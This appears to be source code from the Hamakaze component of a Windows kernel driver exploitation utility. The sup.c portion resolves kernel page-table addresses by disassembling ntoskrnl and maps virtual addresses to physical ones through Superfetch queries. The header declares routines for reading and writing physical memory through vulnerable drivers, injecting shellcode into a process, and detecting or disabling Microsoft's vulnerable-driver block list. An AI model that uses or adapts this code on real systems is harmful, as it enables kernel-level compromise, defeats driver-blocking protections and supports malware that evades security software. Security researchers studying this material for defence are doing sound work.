ULONG_PTR supResolveMiPteBaseAddress(
    _In_opt_ PVOID NtOsBase
)
{
    BOOL bFree = FALSE;
    ULONG offset = 0;
    PBYTE ptrCode;
    PVOID ntosBase = NtOsBase;
    ULONG_PTR pteBaseAddress = 0, ntosLoadedBase, address = 0;
    hde64s hs;

    WCHAR szNtos[MAX_PATH * 2];

    do {

        StringCchPrintf(szNtos, RTL_NUMBER_OF(szNtos), 
            TEXT("%ws\\system32\\%ws"),
            USER_SHARED_DATA->NtSystemRoot,
            NTOSKRNL_EXE);       

        if (ntosBase == NULL) {
            ntosBase = LoadLibraryEx(szNtos, NULL, DONT_RESOLVE_DLL_REFERENCES);
            bFree = (ntosBase != NULL);
        }

        if (ntosBase == NULL)
            break;

        ntosLoadedBase = supGetNtOsBase();
        if (ntosLoadedBase == 0)
            break;

        if (!symLoadImageSymbols(szNtos, (PVOID)ntosBase, 0))
            break;

        if (!symLookupAddressBySymbol("MiFillPteHierarchy", &address))
            break;

        ptrCode = (PBYTE)address;

        RtlSecureZeroMemory(&hs, sizeof(hs));

        do {

            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == 10) {

                // mov r8, MiPteBase
                if (*(PUSHORT)(ptrCode + offset) == 0xb849) {
                    ptrCode = ptrCode + offset + 2;
                    pteBaseAddress = ntosLoadedBase + ptrCode - (PBYTE)ntosBase;
                    break;
                }

            }

            offset += hs.len;

        } while (offset < 64);

    } while (FALSE);

    if (bFree) FreeLibrary((HMODULE)ntosBase);

    return pteBaseAddress;
}

/*
* supCreatePteHierarchy
*
* Purpose:
*
* nt!MiCreatePteHierarchy rip-off.
*
*/
VOID supCreatePteHierarchy(
    _In_ ULONG_PTR VirtualAddress,
    _Inout_ MI_PTE_HIERARCHY* PteHierarchy,
    _In_ ULONG_PTR MiPteBase
)
{
    ///
    /// Resolve the PTE address.
    /// 
    VirtualAddress >>= 9;
    VirtualAddress &= 0x7FFFFFFFF8;
    VirtualAddress += MiPteBase;

    PteHierarchy->PTE = VirtualAddress;

    ///
    /// Resolve the PDE address.
    /// 
    VirtualAddress >>= 9;
    VirtualAddress &= 0x7FFFFFFFF8;
    VirtualAddress += MiPteBase;

    PteHierarchy->PDE = VirtualAddress;

    ///
    /// Resolve the PPE address.
    /// 
    VirtualAddress >>= 9;
    VirtualAddress &= 0x7FFFFFFFF8;
    VirtualAddress += MiPteBase;

    PteHierarchy->PPE = VirtualAddress;

    ///
    /// Resolve the PXE address.
    /// 
    VirtualAddress >>= 9;
    VirtualAddress &= 0x7FFFFFFFF8;
    VirtualAddress += MiPteBase;

    PteHierarchy->PXE = VirtualAddress;
}

/*
* supShowHardError
*
* Purpose:
*
* Display hard error.
*
*/
VOID supShowHardError(
    _In_ LPCSTR Message,
    _In_ NTSTATUS HardErrorStatus
)
{
    ULONG dwFlags;
    HMODULE hModule = NULL;
    WCHAR errorBuffer[1024];

    if (HRESULT_FACILITY(HardErrorStatus) == FACILITY_WIN32) {
        dwFlags = FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM;
    }
    else {
        dwFlags = FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_HMODULE;
        hModule = GetModuleHandle(RtlNtdllName);
    }

    RtlSecureZeroMemory(errorBuffer, sizeof(errorBuffer));

    if (FormatMessage(dwFlags,
        hModule,
        HardErrorStatus,
        0,
        errorBuffer,
        RTL_NUMBER_OF(errorBuffer),
        NULL))
    {
        supPrintfEvent(kduEventError, "%s, NTSTATUS (0x%lX): %ws",
            Message,
            HardErrorStatus,
            errorBuffer);

    }
    else {
        supPrintfEvent(kduEventError, "%s, NTSTATUS (0x%lX)\r\n",
            Message,
            HardErrorStatus);
    }
}

/*
* supShowWin32Error
*
* Purpose:
*
* Display win32 error.
*
*/
VOID supShowWin32Error(
    _In_ LPCSTR Message,
    _In_ DWORD Win32Error
)
{
    ULONG dwFlags = FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM;
    WCHAR errorBuffer[1024];

    RtlSecureZeroMemory(errorBuffer, sizeof(errorBuffer));

    if (FormatMessage(dwFlags,
        NULL,
        Win32Error,
        0,
        errorBuffer,
        RTL_NUMBER_OF(errorBuffer),
        NULL))
    {
        supPrintfEvent(kduEventError, "%s, GetLastError %lu: %ws",
            Message,
            Win32Error,
            errorBuffer);

    }
    else {
        supPrintfEvent(kduEventError, "%s, GetLastError %lu\r\n",
            Message,
            Win32Error);
    }
}

/*
* supIpcOnException
*
* Purpose:
*
* ALPC receive exception callback.
*
*/
VOID CALLBACK supIpcOnException(
    _In_ ULONG ExceptionCode,
    _In_opt_ PVOID UserContext
)
{
    UNREFERENCED_PARAMETER(UserContext);

    supPrintfEvent(kduEventError,
        "[!] Exception 0x%lx thrown during IPC callback\r\n", ExceptionCode);
}

/*
* supIpcDuplicateHandleCallback
*
* Purpose:
*
* ALPC receive message callback for IPC_GET_HANDLE case.
*
*/
VOID CALLBACK supIpcDuplicateHandleCallback(
    _In_ PCLIENT_ID ClientId,
    _In_ PKDU_MSG Message,
    _In_opt_ PVOID UserContext
)
{
    KDU_CONTEXT* Context = (PKDU_CONTEXT)UserContext;

    if (Context == NULL)
        return;

    __try {

        if (Message->Function == IPC_GET_HANDLE &&
            Message->Status == STATUS_SECRET_TOO_LONG)
        {
            HANDLE hProcess = NULL, hNewHandle = NULL;
            OBJECT_ATTRIBUTES obja;

            InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);

            if (NT_SUCCESS(NtOpenProcess(&hProcess,
                PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_TERMINATE,
                &obja,
                ClientId)))
            {
                PVOID wow64Information = NULL;
                ULONG returnLength;
                BOOL validLength = FALSE;

                if (NT_SUCCESS(NtQueryInformationProcess(hProcess,
                    ProcessWow64Information,
                    &wow64Information,
                    sizeof(wow64Information),
                    &returnLength)))
                {
                    if (wow64Information == NULL)
                        validLength = (Message->ReturnedLength == sizeof(HANDLE));
                    else
                        validLength = (Message->ReturnedLength == sizeof(ULONG));

                    if (validLength) {

                        if (NT_SUCCESS(NtDuplicateObject(
                            hProcess,
                            (HANDLE)Message->Data,
                            NtCurrentProcess(),
                            &hNewHandle,
                            0,
                            0,
                            DUPLICATE_SAME_ACCESS)))
                        {
                            Context->DeviceHandle = hNewHandle;
                        }

                    }

                }
                NtTerminateProcess(hProcess, STATUS_TOO_MANY_SECRETS);
                NtClose(hProcess);
            }

        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return;
    }
}

/*
* supQuerySuperfetchInformation
*
* Purpose:
*
* Query Superfetch information.
*
*/
NTSTATUS supQuerySuperfetchInformation(
    _In_ SUPERFETCH_INFORMATION_CLASS InfoClass,
    _In_ PVOID Buffer,
    _In_ ULONG Length,
    _Out_opt_ PULONG ReturnLength)
{
    NTSTATUS ntStatus;
    ULONG returnedLength = 0;

    struct {
        ULONG Version;
        ULONG Magic;
        ULONG InfoClass;
        PVOID Data;
        ULONG Length;
    } superfetchInfo;

    RtlSecureZeroMemory(&superfetchInfo, sizeof(superfetchInfo));
    superfetchInfo.Version = SUPERFETCH_VERSION;
    superfetchInfo.Magic = SUPERFETCH_MAGIC;
    superfetchInfo.InfoClass = (ULONG)InfoClass;
    superfetchInfo.Data = Buffer;
    superfetchInfo.Length = Length;

    ntStatus = NtQuerySystemInformation(
        SystemSuperfetchInformation,
        &superfetchInfo,
        sizeof(superfetchInfo),
        &returnedLength);

    if (ReturnLength)
        *ReturnLength = returnedLength;

    return ntStatus;
}

/*
* supQuerySuperfetchMemoryRanges
*
* Purpose:
*
* Query physical memory ranges via Superfetch.
* Automatically selects V1 or V2 based on OS version.
*
*/
BOOL supQuerySuperfetchMemoryRanges(
    _Out_ PVOID* RangeBuffer,
    _Out_ PULONG RangeCount)
{
    NTSTATUS ntStatus;
    ULONG bufferLength = 0;
    ULONG ntBuildNumber;
    PVOID buffer = NULL;

    struct {
        ULONG Version;
        ULONG Flags;
        ULONG RangeCount;
    } rangeInfoV2;

    struct {
        ULONG Version;
        ULONG RangeCount;
    } rangeInfoV1;

    *RangeBuffer = NULL;
    *RangeCount = 0;

    ntBuildNumber = NtCurrentPeb()->OSBuildNumber;

    //
    // Windows 10 1809 (17763) and later use V2
    //
    if (ntBuildNumber >= NT_WIN10_REDSTONE5) {

        RtlSecureZeroMemory(&rangeInfoV2, sizeof(rangeInfoV2));
        rangeInfoV2.Version = 2;

        ntStatus = supQuerySuperfetchInformation(
            SuperfetchMemoryRangesQuery,
            &rangeInfoV2,
            sizeof(rangeInfoV2),
            &bufferLength);

        if (ntStatus == STATUS_BUFFER_TOO_SMALL && bufferLength > 0) {

            buffer = supHeapAlloc(bufferLength);
            if (buffer == NULL)
                return FALSE;

            RtlSecureZeroMemory(buffer, bufferLength);
            ((PPF_MEMORY_RANGE_INFO_V2)buffer)->Version = 2;

            ntStatus = supQuerySuperfetchInformation(
                SuperfetchMemoryRangesQuery,
                buffer,
                bufferLength,
                NULL);

            if (NT_SUCCESS(ntStatus)) {
                *RangeBuffer = buffer;
                *RangeCount = ((PPF_MEMORY_RANGE_INFO_V2)buffer)->RangeCount;
                return TRUE;
            }

            supHeapFree(buffer);
        }
    }

    //
    // Older Windows or V2 failed - try V1
    //
    RtlSecureZeroMemory(&rangeInfoV1, sizeof(rangeInfoV1));
    rangeInfoV1.Version = 1;
    bufferLength = 0;

    ntStatus = supQuerySuperfetchInformation(
        SuperfetchMemoryRangesQuery,
        &rangeInfoV1,
        sizeof(rangeInfoV1),
        &bufferLength);

    if (ntStatus == STATUS_BUFFER_TOO_SMALL && bufferLength > 0) {

        buffer = supHeapAlloc(bufferLength);
        if (buffer == NULL)
            return FALSE;

        RtlSecureZeroMemory(buffer, bufferLength);
        ((PPF_MEMORY_RANGE_INFO_V1)buffer)->Version = 1;

        ntStatus = supQuerySuperfetchInformation(
            SuperfetchMemoryRangesQuery,
            buffer,
            bufferLength,
            NULL);

        if (NT_SUCCESS(ntStatus)) {
            *RangeBuffer = buffer;
            *RangeCount = ((PPF_MEMORY_RANGE_INFO_V1)buffer)->RangeCount;
            return TRUE;
        }

        supHeapFree(buffer);
    }

    return FALSE;
}

/*
* supBuildSuperfetchMemoryMap
*
* Purpose:
*
* Build virtual-to-physical translation table using Superfetch.
*
*/
BOOL supBuildSuperfetchMemoryMap(
    _Out_ PSUPERFETCH_MEMORY_MAP MemoryMap)
{
    NTSTATUS ntStatus;
    ULONG ntBuildNumber;
    ULONG rangeCount = 0;
    ULONG i;
    SIZE_T j;
    ULONG_PTR basePfn, pageCount;
    ULONG pfnBufferSize;
    ULONG_PTR totalPages = 0;
    ULONG_PTR currentEntry = 0;
    BOOL useV2;
    PVOID rangeBuffer = NULL;
    PPF_PFN_PRIO_REQUEST pfnRequest = NULL;
    PSUPERFETCH_TRANSLATION_ENTRY translationTable = NULL;

    RtlSecureZeroMemory(MemoryMap, sizeof(SUPERFETCH_MEMORY_MAP));

    if (!supQuerySuperfetchMemoryRanges(&rangeBuffer, &rangeCount))
        return FALSE;

    ntBuildNumber = NtCurrentPeb()->OSBuildNumber;
    useV2 = (ntBuildNumber >= NT_WIN10_REDSTONE5);

    //
    // Calculate total pages
    //
    for (i = 0; i < rangeCount; i++) {
        if (useV2) {
            pageCount = ((PPF_MEMORY_RANGE_INFO_V2)rangeBuffer)->Ranges[i].PageCount;
        }
        else {
            pageCount = ((PPF_MEMORY_RANGE_INFO_V1)rangeBuffer)->Ranges[i].PageCount;
        }
        totalPages += pageCount;
    }

    if (totalPages == 0) {
        supHeapFree(rangeBuffer);
        return FALSE;
    }

    translationTable = (PSUPERFETCH_TRANSLATION_ENTRY)supHeapAlloc(
        totalPages * sizeof(SUPERFETCH_TRANSLATION_ENTRY));

    if (translationTable == NULL) {
        supHeapFree(rangeBuffer);
        return FALSE;
    }

    //
    // Query PFN information for each range
    //
    for (i = 0; i < rangeCount; i++) {

        if (useV2) {
            basePfn = ((PPF_MEMORY_RANGE_INFO_V2)rangeBuffer)->Ranges[i].BasePfn;
            pageCount = ((PPF_MEMORY_RANGE_INFO_V2)rangeBuffer)->Ranges[i].PageCount;
        }
        else {
            basePfn = ((PPF_MEMORY_RANGE_INFO_V1)rangeBuffer)->Ranges[i].BasePfn;
            pageCount = ((PPF_MEMORY_RANGE_INFO_V1)rangeBuffer)->Ranges[i].PageCount;
        }

        pfnBufferSize = (ULONG)(FIELD_OFFSET(PF_PFN_PRIO_REQUEST, PageData) +
            (pageCount * sizeof(MMPFN_IDENTITY)));

        pfnRequest = (PPF_PFN_PRIO_REQUEST)supHeapAlloc(pfnBufferSize);
        if (pfnRequest == NULL)
            continue;

        RtlSecureZeroMemory(pfnRequest, pfnBufferSize);
        pfnRequest->Version = 1;
        pfnRequest->RequestFlags = 1;
        pfnRequest->PfnCount = pageCount;

        for (j = 0; j < pageCount; j++) {
            pfnRequest->PageData[j].PageFrameIndex = basePfn + j;
        }

        ntStatus = supQuerySuperfetchInformation(
            SuperfetchPfnQuery,
            pfnRequest,
            pfnBufferSize,
            NULL);

        if (NT_SUCCESS(ntStatus)) {

            for (j = 0; j < pageCount; j++) {

                ULONG_PTR virtAddr = (ULONG_PTR)pfnRequest->PageData[j].u2.VirtualAddress;

                if (virtAddr != 0 && (virtAddr & 0xFFFF800000000000ULL)) {
                    translationTable[currentEntry].VirtualAddress = virtAddr & ~(PAGE_SIZE - 1);
                    translationTable[currentEntry].PhysicalAddress = (basePfn + j) << PAGE_SHIFT;
                    currentEntry++;
                }
            }
        }

        supHeapFree(pfnRequest);
    }

    supHeapFree(rangeBuffer);

    if (currentEntry > 0) {
        MemoryMap->TranslationTable = translationTable;
        MemoryMap->TableSize = currentEntry;
        MemoryMap->RangeCount = rangeCount;
        return TRUE;
    }

    supHeapFree(translationTable);
    return FALSE;
}

/*
* supFreeSuperfetchMemoryMap
*
* Purpose:
*
* Free Superfetch memory map resources.
*
*/
VOID supFreeSuperfetchMemoryMap(
    _In_ PSUPERFETCH_MEMORY_MAP MemoryMap)
{
    if (MemoryMap->TranslationTable) {
        supHeapFree(MemoryMap->TranslationTable);
        MemoryMap->TranslationTable = NULL;
    }
    MemoryMap->TableSize = 0;
    MemoryMap->RangeCount = 0;
}

/*
* supSuperfetchVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to physical using pre-built memory map.
*
*/
BOOL supSuperfetchVirtualToPhysical(
    _In_ PSUPERFETCH_MEMORY_MAP MemoryMap,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ PULONG_PTR PhysicalAddress)
{
    ULONG_PTR i;
    ULONG_PTR alignedVA;
    ULONG_PTR pageOffset;
    PSUPERFETCH_TRANSLATION_ENTRY table;

    *PhysicalAddress = 0;

    if (MemoryMap == NULL || MemoryMap->TranslationTable == NULL)
        return FALSE;

    alignedVA = VirtualAddress & ~(PAGE_SIZE - 1);
    pageOffset = VirtualAddress & (PAGE_SIZE - 1);
    table = MemoryMap->TranslationTable;

    for (i = 0; i < MemoryMap->TableSize; i++) {
        if (table[i].VirtualAddress == alignedVA) {
            *PhysicalAddress = table[i].PhysicalAddress + pageOffset;
            return TRUE;
        }
    }

    return FALSE;
}

```

`Source/Hamakaze/sup.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       SUP.H
*
*  VERSION:     1.45
*
*  DATE:        02 Dec 2025
*
*  Support routines header file.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

//#define VERBOSE_FUNCTION_LOG

typedef struct _SUP_SETUP_DRVPKG {
    HDEVINFO DeviceInfo;
    SP_DEVINFO_DATA DeviceInfoData;
    LPCWSTR CatalogFile;
    LPCWSTR InfFile;
    ULONG CatalogFileResourceId;
    ULONG InfFileResourceId;
    BYTE* Hwid;
    ULONG HwidLength;
    ULONG InstallFlags;
    WCHAR DeviceName[MAX_PATH];
} SUP_SETUP_DRVPKG, * PSUP_SETUP_DRVPKG;

typedef BOOL(CALLBACK* pfnOpenProcessCallback)(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle);

typedef BOOL(CALLBACK* pfnDuplicateHandleCallback)(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE SourceProcessId, //some drivers need pid not handle
    _In_opt_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options);

typedef BOOL(CALLBACK* pfnSetupDeviceEnumCallback)(
    _In_ HDEVINFO DeviceInfo,
    _In_ PSP_DEVINFO_DATA DeviceInfoData,
    _In_ PVOID Param
    );

typedef NTSTATUS(CALLBACK* pfnLoadDriverCallback)(
    _In_ PUNICODE_STRING RegistryPath,
    _In_opt_ PVOID Param
    );

#define supEnablePrivilege ntsupEnablePrivilege
#define supQueryHVCIState ntsupQueryHVCIState
#define supExpandEnvironmentStrings ntsupExpandEnvironmentStrings
#define supQueryResourceData ntsupQueryResourceData
#define supWriteBufferToFile ntsupWriteBufferToFile
#define supIsObjectExists ntsupIsObjectExists
#define supConvertToAnsi ntsupConvertToAnsi
#define supQueryObjectInformation ntsupQueryObjectInformation
#define supEnumSystemObjects ntsupEnumSystemObjects
#define supFindModuleEntryByAddress ntsupFindModuleEntryByAddress

#ifdef VERBOSE_FUNCTION_LOG
#define FUNCTION_ENTER_MSG(lpFunctionName) printf_s("[>] Entering %s\r\n", lpFunctionName)
#define FUNCTION_LEAVE_MSG(lpFunctionName) printf_s("[<] Leaving %s\r\n", lpFunctionName)
#else
#define FUNCTION_ENTER_MSG(lpFunctionName) 
#define FUNCTION_LEAVE_MSG(lpFunctionName)
#endif

typedef enum _KDU_EVENT_TYPE {
    kduEventNone = 0,
    kduEventError,
    kduEventInformation,
    kduEventMax
} KDU_EVENT_TYPE, * PKDU_EVENT_TYPE;

typedef BOOL(WINAPI* pfnPhysMemEnumCallback)(
    _In_ ULONG_PTR Address,
    _In_ PVOID UserContext);

#define GET_CPU_VENDOR_STRING(VendorString) \
    INT cpuInfo[4]; \
    RtlFillMemory(cpuInfo, sizeof(cpuInfo), 0); \
    __cpuid((INT*)cpuInfo, 0); \
    *(DWORD*)(VendorString) = cpuInfo[1]; \
    *(DWORD*)(VendorString + 4) = cpuInfo[3]; \
    *(DWORD*)(VendorString + 8) = cpuInfo[2]; \

typedef enum _PAGE_TYPE {
    PageTypePte,
    PageTypePde
} PAGE_TYPE;

BOOL supIsSupportedCpuVendor(
    _In_ LPCSTR Vendor,
    _In_ ULONG Length);

PVOID FORCEINLINE supHeapAlloc(
    _In_ SIZE_T Size);

BOOL FORCEINLINE supHeapFree(
    _In_ PVOID Memory);

PVOID supAllocateLockedMemory(
    _In_ SIZE_T Size,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect);

BOOL supFreeLockedMemory(
    _In_ PVOID Memory,
    _In_ SIZE_T LockedSize);

PVOID supMapPhysicalMemory(
    _In_ HANDLE SectionHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL MapForWrite);

VOID supUnmapPhysicalMemory(
    _In_ PVOID BaseAddress);

BOOL WINAPI supReadWritePhysicalMemory(
    _In_ HANDLE SectionHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite);

BOOL WINAPI supOpenPhysicalMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ pfnDuplicateHandleCallback DuplicateHandleCallback,
    _Out_ PHANDLE PhysicalMemoryHandle);

BOOL WINAPI supOpenPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ pfnOpenProcessCallback OpenProcessCallback,
    _In_ pfnDuplicateHandleCallback DuplicateHandleCallback,
    _Out_ PHANDLE PhysicalMemoryHandle);

NTSTATUS supCallDriverEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength,
    _Out_opt_ PIO_STATUS_BLOCK IoStatus);

BOOL supCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength);

NTSTATUS supLoadDriverEx(
    _In_ LPCWSTR DriverName,
    _In_ LPCWSTR DriverPath,
    _In_ BOOLEAN UnloadPreviousInstance,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam);

NTSTATUS supLoadDriver(
    _In_ LPCWSTR DriverName,
    _In_ LPCWSTR DriverPath,
    _In_ BOOLEAN UnloadPreviousInstance);

NTSTATUS supUnloadDriver(
    _In_ LPCWSTR DriverName,
    _In_ BOOLEAN fRemove);

NTSTATUS supOpenDriverEx(
    _In_ LPCWSTR DriverName,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE DeviceHandle);

NTSTATUS supOpenDriver(
    _In_ LPCWSTR DriverName,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE DeviceHandle);

PVOID supGetLoadedModulesList(
    _In_ BOOL ExtendedOutput,
    _Out_opt_ PULONG ReturnLength);

PVOID supGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass);

ULONG_PTR supGetNtOsBase(
    VOID);

PBYTE supReadFileToBuffer(
    _In_ LPWSTR lpFileName,
    _Inout_opt_ LPDWORD lpBufferSize);

ULONG_PTR supGetProcAddress(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR FunctionName);

VOID supResolveKernelImport(
    _In_ ULONG_PTR Image,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase);

BOOL supQueryObjectFromHandle(
    _In_ HANDLE hOject,
    _Out_ ULONG_PTR* Address);

BOOL supGetCommandLineOption(
    _In_ LPCTSTR OptionName,
    _In_ BOOL IsParametric,
    _Inout_opt_ LPTSTR OptionValue,
    _In_ ULONG ValueSize,
    _Out_opt_ PULONG ParamLength);

BOOLEAN supQuerySecureBootState(
    _Out_ PBOOLEAN pbSecureBoot);

NTSTATUS supGetFirmwareType(
    _Out_ PFIRMWARE_TYPE FirmwareType);

ULONG_PTR supQueryMaximumUserModeAddress();

DWORD supCalculateCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength);

BOOLEAN supVerifyMappedImageMatchesChecksum(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength,
    _Out_opt_ PULONG HeaderChecksum,
    _Out_opt_ PULONG CalculatedChecksum);

BOOL supReplaceDllEntryPoint(
    _In_ PVOID DllImage,
    _In_ ULONG SizeOfDllImage,
    _In_ LPCSTR lpEntryPointName,
    _In_ BOOL fConvertToExe);

ULONG_PTR supGetPML4FromLowStub1M(
    _In_ ULONG_PTR pbLowStub1M);

NTSTATUS supCreateSystemAdminAccessSD(
    _Out_ PSECURITY_DESCRIPTOR * SecurityDescriptor,
    _Out_ PACL * DefaultAcl);

ULONG supGetTimeAsSecondsSince1970();

ULONG_PTR supGetModuleBaseByName(
    _In_ LPCWSTR ModuleName,
    _Out_opt_ PULONG ImageSize);

BOOL supManageDummyDll(
    _In_ LPCWSTR lpDllName,
    _In_ BOOLEAN fRemove);

ULONG supSelectNonPagedPoolTag(
    VOID);

NTSTATUS supRegWriteValueDWORD(
    _In_ HANDLE RegistryHandle,
    _In_ LPCWSTR ValueName,
    _In_ DWORD ValueData);

NTSTATUS supRegWriteValueString(
    _In_ HANDLE RegistryHandle,
    _In_ LPCWSTR ValueName,
    _In_ LPCWSTR ValueData);

NTSTATUS supLoadFileForMapping(
    _In_ LPCWSTR PayloadFileName,
    _Out_ PVOID * LoadBase);

VOID supPrintfEvent(
    _In_ KDU_EVENT_TYPE Event,
    _Printf_format_string_ LPCSTR Format,
    ...);

NTSTATUS supQueryImageSize(
    _In_ PVOID ImageBase,
    _Out_ PSIZE_T ImageSize);

VOID supGenerateSharedObjectName(
    _In_ WORD ObjectId,
    _Inout_ LPWSTR lpBuffer);

BOOL supSetupManageFsFilterDriverPackage(
    _In_ PVOID Context,
    _In_ BOOLEAN DoInstall,
    _In_ PSUP_SETUP_DRVPKG DriverPackage);

BOOL supSetupManagePnpDriverPackage(
    _In_ PVOID Context,
    _In_ BOOLEAN DoInstall,
    _In_ PSUP_SETUP_DRVPKG DriverPackage);

BOOL supSetupRemoveDriver(
    _In_ HDEVINFO DeviceInfo,
    _In_ SP_DEVINFO_DATA * DeviceInfoData);

BOOL supQueryDeviceProperty(
    _In_ HDEVINFO hDevInfo,
    _In_ SP_DEVINFO_DATA* pDevInfoData,
    _In_ ULONG Property,
    _Out_ LPWSTR* PropertyBuffer,
    _Out_opt_ ULONG* PropertyBufferSize);

BOOL supSetupEnumDevices(
    _In_ pfnSetupDeviceEnumCallback Callback,
    _In_ PVOID CallbackParam);

BOOL supExtractFileFromDB(
    _In_ HMODULE ImageBase,
    _In_ LPCWSTR FileName,
    _In_ ULONG FileId);

VOID supExtractFileToTemp(
    _In_opt_ HMODULE ImageBase,
    _In_opt_ ULONG FileResourceId,
    _In_ LPCWSTR lpTempPath,
    _In_ LPCWSTR lpFileName,
    _In_ BOOL fDelete);

BOOL supDeleteFileWithWait(
    _In_ ULONG WaitMilliseconds,
    _In_ ULONG NumberOfAttempts,
    _In_ LPCWSTR lpFileName);

PVOID supMapFileAsImage(
    _In_ LPWSTR lpImagePath);

BOOL supGenRandom(
    _Inout_ PBYTE pbBuffer,
    _In_ DWORD cbBuffer);

PVOID supGetEntryPointForMappedFile(
    _In_ PVOID ImageBase);

NTSTATUS supInjectPayload(
    _In_ PVOID pvTargetImage,
    _In_ PVOID pbShellCode,
    _In_ ULONG cbShellCode,
    _In_ LPWSTR lpTargetModule,
    _Out_ PHANDLE phZombieProcess);

NTSTATUS supFilterDeviceIoControl(
    _In_ HANDLE Handle,
    _In_ ULONG IoControlCode,
    _In_reads_bytes_(InBufferSize) PVOID InBuffer,
    _In_ ULONG InBufferSize,
    _Out_writes_bytes_to_opt_(OutBufferSize, *BytesReturned) PVOID OutBuffer,
    _In_ ULONG OutBufferSize,
    _Out_opt_ PULONG BytesReturned);

PCM_RESOURCE_LIST supQueryPhysicalMemoryLayout(
    VOID);

BOOL supEnumeratePhysicalMemory(
    _In_ pfnPhysMemEnumCallback Callback,
    _In_ PVOID UserContext);

BOOL supDetectMsftBlockList(
    _In_ PBOOL Enabled,
    _In_ BOOL Disable,
    _In_ ULONG NtBuildNumber,
    _In_ BOOL HvciActive);

ULONG_PTR supResolveMiPteBaseAddress(
    _In_opt_ PVOID NtOsBase);

VOID supCreatePteHierarchy(
    _In_ ULONG_PTR VirtualAddress,
    _Inout_ MI_PTE_HIERARCHY* PteHierarchy,
    _In_ ULONG_PTR MiPteBase);

VOID supShowHardError(
    _In_ LPCSTR Message,
    _In_ NTSTATUS HardErrorStatus);

VOID supShowWin32Error(
    _In_ LPCSTR Message,
    _In_ DWORD Win32Error);

VOID CALLBACK supIpcOnException(
    _In_ ULONG ExceptionCode,
    _In_opt_ PVOID UserContext);

VOID CALLBACK supIpcDuplicateHandleCallback(
    _In_ PCLIENT_ID ClientId,
    _In_ PKDU_MSG Message,
    _In_opt_ PVOID UserContext);

BOOL supBuildSuperfetchMemoryMap(
    _Out_ PSUPERFETCH_MEMORY_MAP MemoryMap);

VOID supFreeSuperfetchMemoryMap(
    _In_ PSUPERFETCH_MEMORY_MAP MemoryMap);

BOOL supSuperfetchVirtualToPhysical(
    _In_ PSUPERFETCH_MEMORY_MAP MemoryMap,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ PULONG_PTR PhysicalAddress);

```

`Source/Hamakaze/sym.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023 - 2026
*
*  TITLE:       SYM.CPP
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  Program symbols support routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include <dbghelp.h>

static HMODULE g_hDbgHelp = NULL;
static HMODULE g_hSymSrv = NULL;
static BOOL g_symInitialized = FALSE;

typedef  DWORD(WINAPI* pfnSymSetOptions)(
    _In_ DWORD   SymOptions
    );

typedef BOOL(WINAPI* pfnSymInitialize)(
    _In_ HANDLE hProcess,
    _In_opt_ PCWSTR UserSearchPath,
    _In_ BOOL fInvadeProcess);

typedef DWORD64(WINAPI* pfnSymLoadModuleEx)(
    _In_ HANDLE hProcess,
    _In_opt_ HANDLE hFile,
    _In_opt_ PCWSTR ImageName,
    _In_opt_ PCWSTR ModuleName,
    _In_ DWORD64 BaseOfDll,
    _In_ DWORD DllSize,
